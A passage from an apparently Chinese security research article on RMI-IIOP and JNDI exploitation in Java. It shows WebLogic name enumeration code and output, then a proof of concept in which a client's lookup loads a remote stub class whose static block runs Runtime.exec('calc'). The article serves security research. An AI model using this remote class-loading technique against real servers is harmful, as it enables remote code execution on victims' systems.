                        lookup.put("class", tmp.getClass());
                        lookup.put("interfaces", tmp.getClass().getInterfaces());
                    }
                } catch (Throwable t) {
                    lookup.put("error msg", t.toString());
                    Object tmp = initialContext.lookup(jndiPath);
                    lookup.put("class", tmp.getClass());
                    lookup.put("interfaces", tmp.getClass().getInterfaces());
                }
                map.put(name, lookup);
            }
            return map;
        }
        private static InitialContext getInitialContext(String url) throws NamingException {
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
            env.put(Context.PROVIDER_URL, url);
            return new InitialContext(env);
        }
    }
list查询结果如下：
    > Listing namespace: 
    > Looking up name: weblogic
    > Listing namespace: 
    > Looking up name: ejb
    > Listing namespace: 
    > Looking up name: mgmt
    > Listing namespace: 
    > Looking up name: MEJB
    > Looking up name: javax
    > Listing namespace: 
    > Looking up name: mejbmejb_jarMejb_EO
    {
        "ejb":{
            "mgmt":{
                "MEJB":{
                    "interfaces":[],
                    "class":"com.sun.corba.se.impl.corba.CORBAObjectImpl"
                },
                "interfaces":["javax.naming.Context"],
                "class":"com.sun.jndi.cosnaming.CNCtx"
            },
            "interfaces":["javax.naming.Context"],
            "class":"com.sun.jndi.cosnaming.CNCtx"
        },
        "javax":{
            "error msg":"org.omg.CORBA.NO_PERMISSION:   vmcid: 0x0  minor code: 0  completed: No",
            "interfaces":["javax.naming.Context"],
            "class":"com.sun.jndi.cosnaming.CNCtx"
        },
        "mejbmejb_jarMejb_EO":{
            "interfaces":[],
            "class":"com.sun.corba.se.impl.corba.CORBAObjectImpl"
        },
        "weblogic":{
            "error msg":"org.omg.CORBA.NO_PERMISSION:   vmcid: 0x0  minor code: 0  completed: No",
            "interfaces":["javax.naming.Context"],
            "class":"com.sun.jndi.cosnaming.CNCtx"
        }
    }
这些远程对象的名称和通过默认的rmi://协议查询的结果是一样的，只是class和interfaces不同。
但是到`managementHome.remove`就报错了，managementHome为null。在上面RMI-IIOP的测试中，客户端要调用远程需要用到客户端的Stub类，去查找了下`ejb/mgmt/MEJB`对应的实现类`weblogic.management.j2ee.mejb.Mejb_dj5nps_HomeImpl`，他有一个Stub类为`weblogic.management.j2ee.mejb.Mejb_dj5nps_HomeImpl_1036_WLStub`，但是这个Stub类是为默认的RMI
JRMP方式生成的，并没有为IIOP调用生成客户端与服务端类，只是绑定了一个名称。
通过一些查找，每一个IIOP远程对象对应的Tie类和Stub类都会有一个特征：
根据这个特征，在Weblogic中确实有很多这种已经为IIOP调用生成的客户端Stub类，例如`_MBeanHomeImpl_Stub`类，是`MBeanHomeImpl`客户端的Stub类：
一个很尴尬的事情就是，Weblogic默认绑定了远程名称的实现类没有为IIOP实现服务端类与客户端类，但是没有绑定的一些类却实现了，所以默认无法利用了。
刚才调用失败了，来看下没有成功调用的通信：
在COSNaming查询包之后，服务端返回了type_ip为`RMI:javax.management.j2ee.ManagementHome:0000000000000000`的标志，
然后下一个包又继续了一个`_is_a`查询：
下一个包就返回了type_id not match：
可以猜测的是服务端没有生成IIOP对应的服务端与客户端类，然后命名服务器中找不到关于的`RMI:javax.management.j2ee.ManagementHome:0000000000000000`标记，通过查找也确实没有找到对应的类。
不过上面这种利用方式只是在代码层调用遵守了Corba
IIOP的一些规范，规规矩矩的调用，在协议层能不能通过替换、修改等操作进行构造与利用，能力有限，未深入研究IIOP通信过程。
在今年的那个议题RMI-IIOP部分，给出了Websphere一个拦截器类TxServerInterceptor中使用到`read_any`方法的情况，从这个名字中可以看出是一个拦截器，所以基本上所有请求都会经过这里。这里最终也调用到`read_value`，就像上面的`_HelloImpl_Tie.read_value`一样，这里也能进行可以利用，只要目标服务器存在可利用的链，作者也给出了一些Websphere中的利用链。可以看到，不只是在远程调用中会存在恶意利用的地方，在其他地方也可能以另一种方式存在，不过在方法调用链中核心的几个地方依然没有变，`CDRInputStream`与`read_value`，可能手动去找这些特征很累甚至可能根本找不到，那么庞大的代码量，不过要是有所有的方法调用链，例如GatgetInspector那种工具，之前[初步分析](https://paper.seebug.org/1034/)过这个工具。这是后面的打算了，目标是自由的编写自己的控制逻辑。
#### JNDI中的利用
在JNDI利用中有多种的利用方式，而RMI-IIOP只是默认RMI利用方式（通过JRMP传输）的替代品，在RMI默认利用方式无法利用时，可以考虑用这种方式。但是这种方式依然会受到SecurityManager的限制。
在RMI-IIOP测试代码中，我把client与server放在了一起，客户端与服务端使用的Tie与Stub也放在了一起，可能会感到迷惑。那下面我们就单独把Client拿出来进行测试以及看下远程加载。
服务端代码还是使用RMI-IIOP中的Server，但是加了一个codebase：
    package com.longofo.example;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.util.Hashtable;
    public class HelloServer {
        public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory";
        public static void main(String[] args) {
            try {
                System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
                //实例化Hello servant
                HelloImpl helloRef = new HelloImpl();
                //使用JNDI在命名服务中发布引用
                InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050");
                initialContext.rebind("HelloService", helloRef);
                System.out.println("Hello Server Ready...");
                Thread.currentThread().join();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        private static InitialContext getInitialContext(String url) throws NamingException {
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
            env.put(Context.PROVIDER_URL, url);
            return new InitialContext(env);
        }
    }
Client代码在新建的[rmi-iiop-test-client]()模块，这样模块之间不会受到影响，Client代码如下：
    package com.longofo.example;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.rmi.RMISecurityManager;
    import java.util.Hashtable;
    public class HelloClient {
        public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory";
        public static void main(String[] args) {
            try {
                System.setProperty("java.security.policy", HelloClient.class.getClassLoader().getResource("java.policy").getFile());
                RMISecurityManager securityManager = new RMISecurityManager();
                System.setSecurityManager(securityManager);
                InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050");
                //从命名服务获取引用
                initialContext.lookup("HelloService");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        private static InitialContext getInitialContext(String url) throws NamingException {
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
            env.put(Context.PROVIDER_URL, url);
            return new InitialContext(env);
        }
    }
然后我在remote-class模块增加了一个`com.longofo.example._HelloInterface_Stub`：
    package com.longofo.example;
    import java.io.BufferedInputStream;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    public class _HelloInterface_Stub {
        static {
            //这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中
            try {
                exec("calc");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void exec(String cmd) throws Exception {
            String sb = "";
            BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String lineStr;
            while ((lineStr = inBr.readLine()) != null)
                sb += lineStr + "\n";
            inBr.close();
            in.close();
            throw new Exception(sb);
        }
    }
启动远程类服务remote-class/src/main/java/com/longofo/remoteclass/HttpServer.java，再启动rmi-iiop/src/main/java/com/longofo/example/HelloServer.java，然后运行客户端rmi-iiop-test-client/src/main/java/com/longofo/example/HelloClient.java即可弹出计算器。在JDK
1.8.0_181测试通过。
至于为什么进行了远程调用，在`CDRInputStream_1_0.read_object`下个断点，然后跟踪就会明白了，最后还是利用了rmi的远程加载功能：
#### 总结
遗憾就是没有成功在Weblogic中利用到RMI-IIOP，在这里写出来提供一些思路，如果大家有关于RMI-IIOP的其他发现与想法也记得分享下。不知道大家有没有关于RMI-IIOP比较好的真实案例。
#### 参考
  1. 
  2. 
  3. 
  4. 
  5. 
* * *